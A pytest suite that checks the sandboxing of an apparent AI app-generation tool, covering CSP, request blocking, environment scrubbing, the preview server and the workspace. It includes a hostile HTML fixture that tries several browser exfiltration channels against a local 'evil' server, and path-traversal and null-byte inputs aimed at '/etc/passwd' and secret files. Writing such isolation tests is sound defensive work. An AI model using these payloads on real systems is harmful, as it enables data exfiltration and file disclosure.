"""Execution-boundary tests. Each layer is tested on its own so a pass cannot be credited to another layer.

A hostile generated app tries to reach an 'evil' local server (HTTP and WebSocket), read the process
environment, share storage across projects, and escape its folder. A preview iframe or plain subprocess
is never treated as isolation here: every claim has a test that tries to break it.
"""
import http.client
import json
import os
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest
from playwright.sync_api import sync_playwright

from appbuilder.config import Limits
from appbuilder.supplied.harness import run_checks, scrubbed_env
from appbuilder.supplied.preview import PreviewServer, csp, serve_directory
from appbuilder.supplied.store import ProjectStore
from appbuilder.supplied.workspace import Workspace, WorkspaceError

L = Limits()


class Evil:
    """A local server standing in for 'the internet'. Records every request it receives."""

    def __init__(self):
        self.hits: list[str] = []
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                outer.hits.append(self.path)
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                self.wfile.write(b"stolen")

            do_POST = do_GET

        self.httpd = HTTPServer(("127.0.0.1", 0), H)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        # a raw listener to see whether a WebSocket handshake ever arrives
        self.ws_hits = 0
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(5)
        self.ws_port = self.sock.getsockname()[1]
        threading.Thread(target=self._accept, daemon=True).start()

    def _accept(self):
        while True:
            try:
                c, _ = self.sock.accept()
            except OSError:
                return
            self.ws_hits += 1
            c.close()

    @property
    def url(self):
        return f"http://127.0.0.1:{self.port}"

    def close(self):
        self.httpd.shutdown()
        self.sock.close()


@pytest.fixture
def evil():
    e = Evil()
    yield e
    e.close()


HOSTILE = """<!doctype html><html><body>
<div data-testid="result">pending</div>
<img data-testid="pic" src="@@U@@/img.png">
<script>
const U = "@@U@@";
const out = [];
const done = (k, v) => { out.push(k + ":" + v); document.querySelector('[data-testid=result]').textContent = out.join("|"); };
fetch(U + "/fetch").then(() => done("fetch", "OK"), () => done("fetch", "blocked"));
const x = new XMLHttpRequest(); x.open("GET", U + "/xhr");
x.onload = () => done("xhr", "OK"); x.onerror = () => done("xhr", "blocked"); x.send();
try { navigator.sendBeacon(U + "/beacon", "data"); } catch (e) {}
try { const w = new WebSocket("ws://127.0.0.1:@@W@@/"); w.onopen = () => done("ws", "OPEN"); w.onerror = () => done("ws", "blocked"); } catch (e) { done("ws", "blocked"); }
if ("serviceWorker" in navigator) navigator.serviceWorker.register("/sw.js").then(() => done("sw", "OK"), () => done("sw", "blocked"));
const s = document.createElement("script"); s.src = U + "/script.js"; document.head.appendChild(s);
const f = document.createElement("form"); f.method = "POST"; f.action = U + "/form"; document.body.appendChild(f);
setTimeout(function () { try { f.submit(); } catch (e) {} }, 300);
</script></body></html>"""


def _page(evil):
    return HOSTILE.replace("@@U@@", evil.url).replace("@@W@@", str(evil.ws_port))


def _hostile(tmp_path, evil, with_csp):
    app = tmp_path / "app"
    app.mkdir()
    (app / "index.html").write_text(_page(evil))
    crit = {"criteria": [{"id": "C1", "title": "hostile page loads", "requirement_ids": ["R1"],
                          "steps": [{"action": "navigate", "page": "index.html"},
                                    {"action": "assert_visible", "target": "result"}]}]}
    return run_checks(app, crit, L, with_csp=with_csp)


# ---- layer: the harness's request blocking, tested with the CSP layer switched OFF -------------------
def test_harness_request_blocking_alone_stops_all_outbound_traffic(tmp_path, evil):
    rep = _hostile(tmp_path, evil, with_csp=False)
    import time
    time.sleep(0.5)
    assert evil.hits == [], f"evil server was contacted: {evil.hits}"
    assert evil.ws_hits == 0, "a WebSocket handshake reached the evil server"
    assert any("/fetch" in b["url"] for b in rep["blocked_requests"])


# ---- layer: the CSP, tested in a bare browser with NO harness routing -------------------------------
def test_csp_alone_blocks_fetch_xhr_and_websocket_in_a_plain_browser(tmp_path, evil):
    app = tmp_path / "app"
    app.mkdir()
    (app / "index.html").write_text(_page(evil))
    httpd, origin = serve_directory(app, with_csp=True)
    args = ["--no-sandbox"] if os.geteuid() == 0 else []
    try:
        with sync_playwright() as pw:
            b = pw.chromium.launch(args=args)
            ctx = b.new_context(service_workers="block")
            pg = ctx.new_page()
            pg.goto(origin + "/index.html")
            pg.wait_for_timeout(1500)
            text = pg.inner_text("[data-testid=result]")
            regs = pg.evaluate("navigator.serviceWorker.getRegistrations().then(r => r.length)")
            b.close()
    finally:
        httpd.shutdown()
    assert evil.hits == [], f"CSP failed to stop: {evil.hits}"
    assert evil.ws_hits == 0
    assert "fetch:OK" not in text and "xhr:OK" not in text and "ws:OPEN" not in text
    assert "fetch:blocked" in text and "xhr:blocked" in text and "ws:blocked" in text
    assert regs == 0, "a service worker was actually registered"  # register() may resolve, but nothing is installed


def test_control_without_csp_or_blocking_the_hostile_page_does_reach_the_network(tmp_path, evil):
    """Control: proves the hostile page is actually capable of exfiltration, so the tests above mean something."""
    app = tmp_path / "app"
    app.mkdir()
    (app / "index.html").write_text(_page(evil))
    httpd, origin = serve_directory(app, with_csp=False)
    args = ["--no-sandbox"] if os.geteuid() == 0 else []
    try:
        with sync_playwright() as pw:
            b = pw.chromium.launch(args=args)
            pg = b.new_context().new_page()
            pg.goto(origin + "/index.html")
            pg.wait_for_timeout(1500)
            b.close()
    finally:
        httpd.shutdown()
    assert evil.hits, "control failed: the hostile page could not reach the evil server even unprotected"


# ---- layer: process environment ---------------------------------------------------------------------
def test_worker_environment_contains_no_secrets(tmp_path, monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "CANARY-SECRET-123")
    monkeypatch.setenv("OPENAI_API_KEY", "CANARY-SECRET-456")
    env = scrubbed_env(str(tmp_path))
    assert not any("CANARY" in v or "KEY" in k for k, v in env.items())
    assert set(env) <= {"PATH", "HOME", "TMPDIR", "LANG", "PLAYWRIGHT_BROWSERS_PATH"}


def test_canary_secret_never_reaches_the_worker_or_the_report(tmp_path, monkeypatch):
    monkeypatch.setenv("GEMINI_API_KEY", "CANARY-SECRET-123")
    app = tmp_path / "app"
    app.mkdir()
    (app / "index.html").write_text("<div data-testid='x'>hi</div>")
    crit = {"criteria": [{"id": "C1", "title": "t", "requirement_ids": ["R1"],
                          "steps": [{"action": "navigate", "page": "index.html"},
                                    {"action": "assert_visible", "target": "x"}]}]}
    rep = run_checks(app, crit, L)
    assert rep["all_passed"]
    assert "CANARY" not in json.dumps(rep)
    keys = rep["conditions"]["worker_env_keys"]
    assert "GEMINI_API_KEY" not in keys and "OPENAI_API_KEY" not in keys


def test_generated_code_cannot_read_process_env_through_the_browser(tmp_path, monkeypatch):
    """Page JS runs in the browser, not in Python. It sees no process environment."""
    monkeypatch.setenv("GEMINI_API_KEY", "CANARY-SECRET-123")
    app = tmp_path / "app"
    app.mkdir()
    (app / "index.html").write_text(
        "<div data-testid='r'>?</div><script>document.querySelector('[data-testid=r]').textContent ="
        "String(typeof process) + '|' + String(typeof require)</script>")
    crit = {"criteria": [{"id": "C1", "title": "t", "requirement_ids": ["R1"],
                          "steps": [{"action": "navigate", "page": "index.html"},
                                    {"action": "assert_text", "target": "r", "equals": "undefined|undefined"}]}]}
    assert run_checks(app, crit, L)["all_passed"]


# ---- layer: the file server -------------------------------------------------------------------------
@pytest.fixture
def served(tmp_path):
    store = ProjectStore(tmp_path / "data")
    pa = store.create("owner-a-0123456789", "A")
    pb = store.create("owner-b-0123456789", "B")
    for pid, marker in ((pa, "AAA"), (pb, "BBB")):
        (store.app_dir(pid) / "index.html").write_text(f"<div data-testid='m'>{marker}</div>")
        (store.app_dir(pid) / "style.css").write_text("body{}")
    (store.dir(pa) / "secret.txt").write_text("TOP-SECRET")
    srv = PreviewServer(store, 0).start()
    yield store, srv, pa, pb
    srv.stop()


def _get(srv, host, path, method="GET"):
    c = http.client.HTTPConnection("127.0.0.1", srv.port, timeout=5)
    c.request(method, path, headers={"Host": host})
    r = c.getresponse()
    return r.status, dict(r.getheaders()), r.read()


def test_preview_serves_only_own_project_by_host(served):
    store, srv, pa, pb = served
    st, h, body = _get(srv, f"{pa}.localhost:{srv.port}", "/index.html")
    assert st == 200 and b"AAA" in body and "default-src 'self'" in h["Content-Security-Policy"]
    st, _, body = _get(srv, f"{pb}.localhost:{srv.port}", "/index.html")
    assert b"BBB" in body
    assert _get(srv, f"pffffffffffffffffffff.localhost:{srv.port}", "/index.html")[0] == 404
    assert _get(srv, "localhost", "/index.html")[0] == 404
    assert _get(srv, "evil.example.com", "/index.html")[0] == 404


@pytest.mark.parametrize("path", ["/../secret.txt", "/%2e%2e/secret.txt", "/..%2fsecret.txt", "/%2e%2e%2fsecret.txt",
                                  "/../../etc/passwd", "//etc/passwd", "/.hidden", "/a/b.html", "/secret.txt",
                                  "/..\\secret.txt", "/index.html%00.txt", "/meta.json", "/approved/criteria.json"])
def test_preview_path_traversal_and_non_app_files_are_refused(served, path):
    store, srv, pa, pb = served
    st, _, body = _get(srv, f"{pa}.localhost:{srv.port}", path)
    assert st == 404 and b"TOP-SECRET" not in body and b"root:" not in body


def test_preview_refuses_mutating_methods_and_serves_no_symlinks(served):
    store, srv, pa, pb = served
    for m in ("POST", "PUT", "DELETE", "PATCH"):
        assert _get(srv, f"{pa}.localhost:{srv.port}", "/index.html", m)[0] == 405
    link = store.app_dir(pa) / "leak.html"
    os.symlink(store.dir(pa) / "secret.txt", link)
    assert _get(srv, f"{pa}.localhost:{srv.port}", "/leak.html")[0] == 404


def test_projects_do_not_share_localstorage_because_origins_differ(served):
    store, srv, pa, pb = served
    args = ["--no-sandbox"] if os.geteuid() == 0 else []
    with sync_playwright() as pw:
        b = pw.chromium.launch(args=args)
        ctx = b.new_context()
        pg = ctx.new_page()
        pg.goto(srv.url(pa))
        pg.evaluate("localStorage.setItem('k','from-A')")
        pg.goto(srv.url(pb))
        seen = pg.evaluate("localStorage.getItem('k')")
        pg.goto(srv.url(pa))
        mine = pg.evaluate("localStorage.getItem('k')")
        b.close()
    assert seen is None and mine == "from-A"


def test_csp_forbids_framing_by_other_sites_and_connect_to_others():
    p = csp("http://localhost:8000")
    assert "connect-src 'self'" in p and "frame-ancestors http://localhost:8000" in p and "default-src 'self'" in p


# ---- layer: the workspace behind the agent's file tools ---------------------------------------------
@pytest.mark.parametrize("name", ["../x.html", "/etc/passwd", "a/b.html", "..\\x.html", ".env", "x.py", "x.html\x00.js",
                                  "", None, 5, "approved.json", "a b.html", "x" * 80 + ".html", "x.HTML.exe"])
def test_workspace_rejects_escaping_or_disallowed_names(tmp_path, name):
    ws = Workspace(tmp_path / "app", L)
    with pytest.raises(WorkspaceError):
        ws.write_file(name, "x")
    with pytest.raises(WorkspaceError):
        ws.read_file(name)


def test_workspace_limits_and_symlinks(tmp_path):
    ws = Workspace(tmp_path / "app", L)
    with pytest.raises(WorkspaceError) as e:
        ws.write_file("big.html", "x" * (L.max_file_bytes + 1))
    assert e.value.code == "too_large"
    for i in range(L.max_files):
        ws.write_file(f"p{i}.html", "x")
    with pytest.raises(WorkspaceError) as e:
        ws.write_file("extra.html", "x")
    assert e.value.code == "too_many_files"
    outside = tmp_path / "outside.txt"
    outside.write_text("secret")
    os.symlink(outside, tmp_path / "app" / "ln.html")
    with pytest.raises(WorkspaceError) as e:
        ws.read_file("ln.html")
    assert e.value.code == "symlink"


def test_agent_workspace_cannot_reach_approved_contract(tmp_path):
    store = ProjectStore(tmp_path / "data")
    pid = store.create("owner-a-0123456789", "A")
    store.approve_contract(pid, {"requirements": []}, {"criteria": []})
    ws = Workspace(store.app_dir(pid), L)
    for name in ("../approved/criteria.json", "approved/criteria.json", "criteria.json"):
        with pytest.raises(WorkspaceError):
            ws.read_file(name)
    assert ws.list_files() == []
